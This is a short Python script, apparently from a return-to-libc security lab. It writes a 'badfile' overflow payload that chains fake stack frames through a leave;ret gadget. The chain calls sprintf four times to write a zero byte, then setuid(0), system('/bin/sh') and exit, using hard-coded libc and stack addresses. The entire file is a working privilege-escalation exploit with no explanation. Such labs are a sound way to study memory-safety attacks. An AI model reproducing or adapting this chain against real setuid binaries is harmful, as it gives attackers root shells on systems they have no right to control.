#!/usr/bin/python3
import sys

def tobytes(value):
    return (value).to_bytes(4, byteorder='little')

content = bytearray(0xaa for i in range(112))

sh_addr = 0xffffd445
leaveret = 0x56556313  #bar's leaveret
sprintf_addr = 0xf7e18d90
setuid_addr = 0xf7e91d90
system_addr = 0xf7e0a360 
exit_addr = 0xf7dfcec0
ebp_foo = 0xffffc9d8

sprintf_arg1 = ebp_foo + 12 + 5*0x20
sprintf_arg2 = sh_addr + len("/bin/sh")

content = bytearray(0xaa for i in range(112))

#intial
ebp_next = ebp_foo + 0x20
content += tobytes(ebp_next)
content += tobytes(leaveret)
content += b'A' * (0x20-2*4)

#sprintf commands
for i in range(4):
    ebp_next += 0x20
    content += tobytes(ebp_next)
    content += tobytes(sprintf_addr)
    content += tobytes(leaveret)
    content += tobytes(sprintf_arg1)
    content += tobytes(sprintf_arg2)
    content += b'A' * (0x20 - 5*4)
    sprintf_arg1 += 1

#setuid(0)
ebp_next += 0x20
content += tobytes(ebp_next)
content += tobytes(setuid_addr)
content += tobytes(leaveret)
content += tobytes(0xFFFFFFFF)
content += b'A' * (0x20 - 4*4)

#system("/bin/sh")
ebp_next += 0x20
content += tobytes(ebp_next)
content += tobytes(system_addr)
content += tobytes(leaveret)
content += tobytes(sh_addr)
content += b'A' * (0x20 - 4*4)

#exit()
content += tobytes(0xFFFFFFFF)
content += tobytes(exit_addr)

with open("badfile", "wb") as f:
    f.write(content)
